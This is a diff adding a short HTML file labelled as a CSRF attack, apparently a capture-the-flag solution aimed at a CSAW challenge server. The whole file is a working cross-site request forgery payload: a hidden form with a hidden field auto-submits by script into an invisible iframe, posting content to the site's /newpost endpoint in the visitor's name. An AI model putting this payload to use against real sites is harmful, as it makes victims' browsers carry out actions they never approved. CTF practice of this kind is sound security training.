@@ -1,0 +1,14 @@
+
+
+
+<!DOCTYPE html>
+<head>CSRF_ATTACK_PT1</head>
+<body>
+    <form name ='csrf_form' target='hiddenFrame' action='http://web.chal.csaw.io:1003/newpost' method="POST">
+        <input type='hidden' name='submission-text' value='[link]hello'>
+    </form>
+    <iframe name='hiddenFrame'  style='display:none'></iframe>
+    <script>
+        document.csrf_form.submit();
+    </script>
+</body>
